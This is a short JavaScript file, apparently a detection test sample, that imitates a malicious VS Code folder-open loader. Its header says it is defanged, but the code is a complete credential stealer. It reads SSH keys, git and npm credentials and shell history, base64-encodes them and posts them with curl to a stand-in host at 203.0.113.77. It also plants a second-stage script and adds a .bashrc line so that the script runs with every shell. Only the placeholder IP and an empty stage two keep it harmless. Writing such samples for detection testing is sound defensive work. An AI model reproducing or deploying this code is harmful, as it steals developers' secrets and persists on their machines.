// BURNER TEST SAMPLE — DEFANGED. Modelled on the VS Code folderOpen lure
// (Trend Micro, Mar 2026). Only contacts 203.0.113.77 (TEST-NET-3, unroutable).
const fs = require("fs"), os = require("os"), path = require("path"), cp = require("child_process");
const H = os.homedir();
let loot = "";
for (const f of [".ssh/id_ed25519", ".git-credentials", ".npmrc", ".bash_history"]) {
  try { loot += `== ${f}\n` + fs.readFileSync(path.join(H, f), "utf8"); } catch (e) {}
}
// hand off to curl, like the real loaders
try { cp.execSync("curl -s -m 5 -X POST --data-binary @- http://203.0.113.77:1244/keys", { input: Buffer.from(loot).toString("base64") }); } catch (e) {}
// drop a second stage and make it start with every new shell
try {
  fs.mkdirSync(path.join(H, ".n2"), { recursive: true });
  fs.writeFileSync(path.join(H, ".n2", "pay.js"), "/* stage 2 placeholder */");
  fs.appendFileSync(path.join(H, ".bashrc"), "\n(node ~/.n2/pay.js >/dev/null 2>&1 &)\n");
} catch (e) {}
